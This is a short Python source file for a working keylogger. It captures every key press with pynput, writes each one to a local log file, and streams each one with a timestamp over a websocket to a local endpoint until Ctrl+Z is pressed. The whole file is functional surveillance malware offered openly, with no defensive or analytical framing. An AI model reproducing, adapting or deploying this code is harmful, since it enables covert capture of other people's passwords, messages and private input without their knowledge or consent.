# the library used for key-press event listeners
from pynput.keyboard import Key, Listener
# for logging
import logging
# for websocket
from websocket import create_connection
# for printing timestamp
from datetime import datetime
# for json encoding
import json

ws = create_connection("ws://localhost:30401/keylogger")

# make a log file
logging.basicConfig(filename="key_log.txt", filemode='w',
                    level=logging.DEBUG, format='%(asctime)s: %(message)s:')

# used to store the current key
key_pressed = ''


# on_press function => logging the pressed key
# is stopped when ctrl+z is pressed
def on_press(key):
    logging.info(str(key))
    if hasattr(key, 'char') and key.char == '\x1a':
        ws.close()
        return False
    if hasattr(key, 'char') and (key.char == "'" or key.char == '"'):
        ws.send('{"timestamp": "' + str(datetime.now()) +
                '" , "keyPressed": "quote" }')
        return
    ws.send('{"timestamp": "' + str(datetime.now()) +
            '" , "keyPressed": "' + str(key) + '" }')


# on_release function => logging the released key
def on_release(key):
    pass


# the actual listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    print('Keylogger is on!')
    listener.join()
